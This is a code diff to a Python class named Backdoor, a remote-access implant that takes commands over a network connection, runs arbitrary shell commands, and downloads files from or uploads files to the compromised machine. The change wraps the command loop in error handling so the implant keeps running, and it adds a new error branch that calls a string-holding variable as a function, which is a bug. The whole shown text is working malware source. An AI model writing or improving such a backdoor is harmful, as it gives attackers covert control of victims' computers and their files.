@@ -24,7 +24,10 @@ class Backdoor:
                 continue 
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        try:
+            return subprocess.check_output(command, shell=True)
+        except:
+            return '[x] Error during command execution'
     
     def change_working_dir(self, path):
         os.chdir(path)
@@ -43,21 +46,28 @@ class Backdoor:
         while True:
             command = self.connection.recv(1024).decode('utf-8')
             
-            if command[0].lower() == 'exit':
-                self.connection.close()
-                exit()
+            try :
 
-            elif command[0].lower() == 'cd' and len(command)>1:
-                command_result = self.change_working_dir(command[1])
+                if command[0].lower() == 'exit':
+                    self.connection.close()
+                    exit()
 
-            elif command[0].lower() == 'download':
-                command_result = self.read_file(command[1])
-            
-            elif command[0].lower() == 'upload': # ['upload', 'file name', 'file content as binary']
-                command_result = self.write(command[1], command[2])
+                elif command[0].lower() == 'cd' and len(command)>1:
+                    command_result = self.change_working_dir(command[1])
 
-            else:
-                command_result = self.execute_system_command(command)
+                elif command[0].lower() == 'download':
+                    command_result = self.read_file(command[1])
+                
+                elif command[0].lower() == 'upload': # ['upload', 'file name', 'file content as binary']
+                    command_result = self.write(command[1], command[2])
+
+                else:
+                    command_result = self.execute_system_command(command)
+
+            except Exception:
+      
+                command_result('[x] Error during command execution')
+
             self.send(command_result)
 
         self.connection.close()
